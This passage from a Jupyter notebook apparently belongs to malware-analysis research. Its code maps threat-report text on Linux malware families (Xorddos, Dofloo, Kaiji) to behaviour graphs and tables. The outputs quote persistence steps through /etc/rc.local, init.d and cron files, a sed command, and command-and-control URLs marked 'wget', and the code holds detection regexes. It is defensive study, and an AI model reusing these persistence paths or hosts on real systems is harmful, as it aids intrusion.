73.84,-46.18 80.84,-46.18\"/>\n<text text-anchor=\"middle\" x=\"99.34\" y=\"-57.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n</g>\n</svg>\n",
      "text/plain": [
       "<graphviz.graphs.Digraph at 0x2501fa9c6a0>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import graphviz\n",
    "\n",
    "class ItemMapper:\n",
    "    def __init__(self) -> None:\n",
    "        self.mapper = {}\n",
    "        self.index_counter:int = 1\n",
    "        # self.pretty_name = {\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\": \"ip_addr\",\n",
    "        #     \"\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+\": \"ip_addr+port\",\n",
    "        #     \"0x[0-9a-zA-Z]{8}\": \"mem_addr\",\n",
    "        #     \"permission:{0,1}[0-9]{0,4}\": \"permission_id\"\n",
    "        # }\n",
    "        pass\n",
    "    def addItem(self, item:str) -> str:\n",
    "        # item = self.prettifyName(item) # 先不在這做~\n",
    "        if item in self.mapper.keys():\n",
    "            return self.mapper.get(item)\n",
    "        self.mapper[item] = str(self.index_counter)\n",
    "        self.index_counter += 1\n",
    "        return str(self.index_counter - 1)\n",
    "    def getSymbol(self, item:str):\n",
    "        return self.mapper.get(item, None)\n",
    "    # def prettifyName(self, item:str) -> str:\n",
    "    #     changed = self.pretty_name.get(item, None)\n",
    "    #     if changed:\n",
    "    #         return changed\n",
    "    #     return item\n",
    "\n",
    "def draw_asg_op_graph(asg_OPset: list[OperationPair], family=None):\n",
    "    dot = graphviz.Digraph(f'{family}_asg_OPset', comment='The Operational Pair Graph') \n",
    "    dot.node('Start', label=\"Malware (Subject)\")\n",
    "    mapper = ItemMapper()\n",
    "    for op in asg_OPset:\n",
    "        node_id = mapper.addItem(op.object)\n",
    "        dot.node(node_id, label=prettifyName(op.object)) # rename partial regex\n",
    "        if op.action:\n",
    "            dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "\n",
    "    # dot.graph_attr.update(ratio=\"0.4\")\n",
    "    u = dot.unflatten(stagger=3, fanout=True)\n",
    "    display(u)\n",
    "    del mapper\n",
    "    return u\n",
    "\n",
    "def draw_ctd_op_graph(fset:FamilySet):\n",
    "    for rem in fset.rem_lst:\n",
    "        # doc_OPset\n",
    "        if rem.doc_OPset is None or len(rem.doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} raw doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_doc_OPset\n",
    "        if rem.match_doc_OPset is None or len(rem.match_doc_OPset) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in rem.match_doc_OPset:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"{rem.reportname} matched doc OPset\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "\n",
    "        # match_ASG_OPset\n",
    "        if rem.OPset_order_index is None or len(rem.OPset_order_index) == 0:\n",
    "            continue\n",
    "        dot = graphviz.Digraph()\n",
    "        dot.node('Start', label=\"Malware (Subject)\")\n",
    "        mapper = ItemMapper()\n",
    "        for op in [fset.sample.OPset_ordered[i] for i in rem.OPset_order_index]:\n",
    "            node_id = mapper.addItem(op.object)\n",
    "            dot.node(node_id, label=prettifyName(op.object))\n",
    "            if op.action:\n",
    "                dot.edge('Start', node_id, label=f\"{op.step_number}.{op.action}\")\n",
    "        print(f\"matched ASG OPset for doc {rem.reportname}\")\n",
    "        display(dot)\n",
    "        del mapper\n",
    "    return\n",
    "\n",
    "draw_asg_op_graph(sample.OPset, family=family)\n",
    "draw_ctd_op_graph(fset)"
   ]
  },
  {
   "attachments": {},
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Run Script: print matched sentence for specific document"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>report</th>\n",
       "      <th>word</th>\n",
       "      <th>verb</th>\n",
       "      <th>objectType</th>\n",
       "      <th>prettyReg</th>\n",
       "      <th>match</th>\n",
       "      <th>label</th>\n",
       "      <th>sentence</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>127.0.0.1</td>\n",
       "      <td>hardcode</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>table 2: data collected by the malware and sen...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>/proc/cpuinfo</td>\n",
       "      <td>extract</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/proc/</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>table 2: data collected by the malware and sen...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>gid</td>\n",
       "      <td>None</td>\n",
       "      <td>INFO</td>\n",
       "      <td>GID(\\$|\\.|$)</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>/usr/syno/etc/rc.d/s99po1kitd-update.sh</td>\n",
       "      <td>None</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/etc/rc</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>Xorddos-Intezer.csv</td>\n",
       "      <td>158.247.208.230</td>\n",
       "      <td>None</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>None</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>61</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>/var/run/gcc.pid</td>\n",
       "      <td>read</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/var/</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>creates symbolic links which points to the scr...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>62</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>/etc/cron.hourly/gcc.sh</td>\n",
       "      <td>drop</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/etc/cron</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>this backdoor drops the following files:  /et...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>63</th>\n",
       "      <td>Xorddos-Trendmicro.csv</td>\n",
       "      <td>/var/run/gcc.pid</td>\n",
       "      <td>read</td>\n",
       "      <td>FILE</td>\n",
       "      <td>/run/</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>creates symbolic links which points to the scr...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>64</th>\n",
       "      <td>Xorddos-Trendmicro2.csv</td>\n",
       "      <td>http://62.171.160.189/linux_arm</td>\n",
       "      <td>find</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>indicators of compromise kaiji  file name\\tsh...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>65</th>\n",
       "      <td>Xorddos-Trendmicro2.csv</td>\n",
       "      <td>http://122.51.133.49:10086/vip</td>\n",
       "      <td>wget</td>\n",
       "      <td>NET</td>\n",
       "      <td>ip_addr</td>\n",
       "      <td>1</td>\n",
       "      <td>1</td>\n",
       "      <td>afterwards, the attackers executed the followi...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>66 rows × 8 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                     report                                     word  \\\n",
       "0       Xorddos-Intezer.csv                                127.0.0.1   \n",
       "1       Xorddos-Intezer.csv                            /proc/cpuinfo   \n",
       "2       Xorddos-Intezer.csv                                      gid   \n",
       "3       Xorddos-Intezer.csv  /usr/syno/etc/rc.d/s99po1kitd-update.sh   \n",
       "4       Xorddos-Intezer.csv                          158.247.208.230   \n",
       "..                      ...                                      ...   \n",
       "61   Xorddos-Trendmicro.csv                         /var/run/gcc.pid   \n",
       "62   Xorddos-Trendmicro.csv                  /etc/cron.hourly/gcc.sh   \n",
       "63   Xorddos-Trendmicro.csv                         /var/run/gcc.pid   \n",
       "64  Xorddos-Trendmicro2.csv          http://62.171.160.189/linux_arm   \n",
       "65  Xorddos-Trendmicro2.csv           http://122.51.133.49:10086/vip   \n",
       "\n",
       "        verb objectType     prettyReg  match  label  \\\n",
       "0   hardcode        NET       ip_addr      0      0   \n",
       "1    extract       FILE        /proc/      1      1   \n",
       "2       None       INFO  GID(\\$|\\.|$)      0      0   \n",
       "3       None       FILE       /etc/rc      0      0   \n",
       "4       None        NET       ip_addr      0      0   \n",
       "..       ...        ...           ...    ...    ...   \n",
       "61      read       FILE         /var/      0      0   \n",
       "62      drop       FILE     /etc/cron      1      1   \n",
       "63      read       FILE         /run/      0      0   \n",
       "64      find        NET       ip_addr      0      0   \n",
       "65      wget        NET       ip_addr      1      1   \n",
       "\n",
       "                                             sentence  \n",
       "0   table 2: data collected by the malware and sen...  \n",
       "1   table 2: data collected by the malware and sen...  \n",
       "2                                                None  \n",
       "3                                                None  \n",
       "4                                                None  \n",
       "..                                                ...  \n",
       "61  creates symbolic links which points to the scr...  \n",
       "62   this backdoor drops the following files:  /et...  \n",
       "63  creates symbolic links which points to the scr...  \n",
       "64   indicators of compromise kaiji  file name\\tsh...  \n",
       "65  afterwards, the attackers executed the followi...  \n",
       "\n",
       "[66 rows x 8 columns]"
      ]
     },
     "execution_count": 17,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 存檔所有 doc_OPset\n",
    "def save_docOPset(fset: FamilySet):\n",
    "    data = []\n",
    "    for idx_rem, rem in enumerate(fset.rem_lst):\n",
    "        ctd_opset:list[OperationPair] = list(rem.doc_OPset)\n",
    "        for op in ctd_opset:\n",
    "            data.append({\n",
    "                'report': rem.reportname,\n",
    "                'word': op.original_object,\n",
    "                'verb': op.action,\n",
    "                'objectType': op.object_type,\n",
    "                'prettyReg': prettifyName(op.object),\n",
    "                'match': 1 if op in rem.match_doc_OPset else 0, # verb 是否有比對到 syscall\n",
    "                'label': 1 if op in rem.match_doc_OPset else 0, # 人工標記的標籤 暫時先跟系統判斷一樣\n",
    "                'sentence': \" \".join(op.original_sentence.splitlines()) if op.original_sentence else None # flatten the sentence segment\n",
    "            })\n",
    "    # print(data)\n",
    "    df = pd.DataFrame(data)\n",
    "    df.to_csv(f'./result/00_{family}_docOPset.csv', index=False)\n",
    "    return df\n",
    "\n",
    "save_docOPset(fset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Report: Dofloo-SyscallParty.csv. Matched OP count: 5\n",
      "--\n",
      "OP #11 open /proc/ /proc/cpuinfo\n",
      "the virtual file /proc/cpuinfo is opened and read in words until an eof (-1) is hit whilst reading the file chunk by chunk — then fclose is called to free up the opened file.\n",
      "--\n",
      "OP #8 read /proc/ /proc/net/dev\n",
      "the way the malware gets information regarding the network adapter is reading the /proc/net/dev file.\n",
      "--\n",
      "OP #4 add /etc/init.d/ /etc/init.d/boot.local\n",
      "persistence\n",
      "persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function); however before it overwrites this file it first checks to see if it has already done so.\n",
      "--\n",
      "OP #7 format /etc/rc /etc/rc.local\n",
      "a string is formatted and the sed program is called which writes to the file in question (there are several string operations, such as sed -i -e '2 i%s/%s' /etc/rc.local is formatted for example).\n",
      "--\n",
      "OP #3 add /etc/rc /etc/rc.local\n",
      "persistence\n",
      "persistence is achieved by the malware by adding to /etc/rc.local and the /etc/init.d/boot.local files (in the auto_boot function); however before it overwrites this file it first checks to see if it has already done so.\n"
     ]
    }
   ],
   "source": [
    "# 印出特定 report 的 matched 句子\n",
    "report_id = 3\n",
    "reportname = fset.rem_lst[report_id].reportname\n",
    "print(f\"Report: {reportname}. Matched OP count: {len(fset.rem_lst[report_id].match_doc_OPset)}\")\n",
    "for i, op in enumerate(fset.rem_lst[report_id].match_doc_OPset):\n",
    "    print(f\"--\\nOP #{op.step_number} {op.action} {op.object} {op.original_object}\")\n",
    "    print(f\"{op.original_sentence}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set()\n",
      "{<OP 8 act=pack, obj=mem_addr>, <OP 5 act=svc, obj=mem_addr>, <OP 6 act=find, obj=mem_addr>, <OP 9 act=eserve, obj=mem_addr>, <OP 7 act=look, obj=mem_addr>, <OP10 act=go, obj=mem_addr>, <OP14 act=None, obj=ip_addr>, <OP 2 act=be, obj=mem_addr>, <OP 1 act=have, obj=mem_addr>, <OP12 act=None, obj=^sed$>, <OP11 act=None, obj=mem_addr>, <OP 3 act=add, obj=mem_addr>, <OP 4 act=r1,r2,r10,r11,lr, obj=mem_addr>, <OP13 act=be, obj=ip_addr>}\n",
      "{<OP 4 act=None, obj=/etc/rc>, <OP 3 act=modify, obj=/etc/rc>, <OP 1 act=connect, obj=ip_addr>, <OP 2 act=connect, obj=ip_addr+port>}\n",
      "{<OP10 act=None, obj=uname(.)($)>, <OP11 act=open, obj=/proc/>, <OP 2 act=None, obj=/proc/>, <OP 9 act=None, obj=ip_addr>, <OP 8 act=read, obj=/proc/>, <OP 4 act=add, obj=/etc/init.d/>, <OP 5 act=execute, obj=/etc/rc>, <OP 7 act=format, obj=/etc/rc>, <OP 3 act=add, obj=/etc/rc>, <OP 1 act=give, obj=mem_addr>, <OP 6 act=format, obj=^sed$>}\n",
      "{<OP 6 act=None, obj=/sys/>, <OP 8 act=open, obj=nsswitch.conf>, <OP 5 act=None, obj=/proc/>, <OP 3 act=start, obj=/etc/init.d/>, <OP 2 act=se, obj=/etc/rc>, <OP 4 act=gather, obj=/proc/>, <OP 7 act=open, obj=resolv.conf>, <OP 1 act=se, obj=^sed$>, <OP 9 act=None, obj=UID>}\n"
     ]
    }
   ],
   "source": [
    "# 測試區\n",
    "for rem in fset.rem_lst:\n",
    "    print(rem.doc_OPset)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>bin/sed</th>\n",
       "      <th>/etc/rc</th>\n",
       "      <th>/etc/init.d/</th>\n",
       "      <th>/proc/</th>\n",
       "      <th>/etc/sed</th>\n",
       "      <th>/selinux</th>\n",
       "      <th>/sys/</th>\n",
       "      <th>bin/</th>\n",
       "      <th>lsb-release</th>\n",
       "      <th>uname(.)($)</th>\n",
       "      <th>...</th>\n",
       "      <th>^sh$</th>\n",
       "      <th>^sed$</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+</th>\n",
       "      <th>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}</th>\n",
       "      <th>eth[0-9]$</th>\n",
       "      <th>0x[0-9a-zA-Z]{8}</th>\n",
       "      <th>permission:{0,1}[0-9]{0,4}</th>\n",
       "      <th>UID</th>\n",
       "      <th>GID</th>\n",
       "      <th>match</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>11</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>12</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>13</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>14</th>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>15 rows × 24 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "    bin/sed  /etc/rc  /etc/init.d/  /proc/  /etc/sed  /selinux  /sys/  bin/  \\\n",
       "0         0        0             0       0         0         0      0     0   \n",
       "1         0        0             0       0         0         0      0     0   \n",
       "2         0        0             0       0         0         0      0     0   \n",
       "3         0        0             0       0         0         0      0     0   \n",
       "4         0        0             0       0         0         0      0     0   \n",
       "5         0        0             0       0         0         0      0     0   \n",
       "6         0        0             0       0         0         0      0     0   \n",
       "7         0        0             0       0         0         0      0     0   \n",
       "8         0        0             0       0         0         0      0     0   \n",
       "9         0        0             0       0         0         0      0     0   \n",
       "10        0        0             0       0         0         0      0     0   \n",
       "11        0        0             0       0         0         0      0     0   \n",
       "12        0        0             0       0         0         0      0     0   \n",
       "13        0        0             0       0         0         0      0     0   \n",
       "14        0        0             0       0         0         0      0     0   \n",
       "\n",
       "    lsb-release  uname(.)($)  ...  ^sh$  ^sed$  \\\n",
       "0             0            0  ...     0      0   \n",
       "1             0            0  ...     0      0   \n",
       "2             0            0  ...     0      0   \n",
       "3             0            0  ...     0      0   \n",
       "4             0            0  ...     0      0   \n",
       "5             0            0  ...     0      0   \n",
       "6             0            0  ...     0      0   \n",
       "7             0            0  ...     0      0   \n",
       "8             0            0  ...     0      0   \n",
       "9             0            0  ...     0      0   \n",
       "10            0            0  ...     0      0   \n",
       "11            0            0  ...     0      0   \n",
       "12            0            0  ...     0      0   \n",
       "13            0            0  ...     0      0   \n",
       "14            0            0  ...     0      0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+  \\\n",
       "0                                        0   \n",
       "1                                        0   \n",
       "2                                        0   \n",
       "3                                        0   \n",
       "4                                        0   \n",
       "5                                        0   \n",
       "6                                        0   \n",
       "7                                        0   \n",
       "8                                        0   \n",
       "9                                        0   \n",
       "10                                       0   \n",
       "11                                       0   \n",
       "12                                       0   \n",
       "13                                       0   \n",
